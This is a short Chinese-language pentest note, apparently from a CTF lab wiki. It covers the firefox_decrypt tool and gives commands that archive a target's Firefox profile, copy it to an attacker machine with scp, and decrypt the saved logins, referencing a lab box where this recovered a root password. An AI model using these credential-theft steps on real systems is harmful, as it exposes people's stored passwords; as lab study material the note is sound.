# [firefox_decrypt](https://github.com/unode/firefox_decrypt)
這是一個用於還原並解密 Mozilla Firefox、Thunderbird 等瀏覽器/客戶端儲存在本地的明文憑證（帳密）的工具。

# 安裝
```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
```

# 用法

## 1. 打包並提取目標配置檔
在 Linux 系統中，Firefox 用戶配置通常存放在 `~/.mozilla/firefox/` 下。我們需要將該目錄下含 `key4.db` (或 `key3.db`) 以及 `logins.json` 的 `.default` 檔案夾打包並下載至攻擊機：

```bash
# 靶機端（打包設定檔）
tar -czvf profile.tar.gz *.default-release/  # 或 *.default/

# 攻擊機端（下載並解壓縮）
scp user@target-ip:/path/to/profile.tar.gz .
tar -xzvf profile.tar.gz
```

## 2. 執行解密
在攻擊機中指定解壓出的配置檔目錄路徑來執行解密指令：
```bash
python3 firefox_decrypt.py /path/to/extracted/profile/
```

*   **若未設定主密碼 (Master Password)**：工具將直接秒破並以明文形式印出所有網站/系統憑證（包含 `Username` 和 `Password`）。
*   **若設定了主密碼**：則需爆破或輸入主密碼才能順利解密。

---

# 實戰關聯
*   **靶機應用實例**：[[InsanityHosting]]（用於提取 elliot 家目錄下的火狐快取，進而還原出 `root` 的明文密碼）。
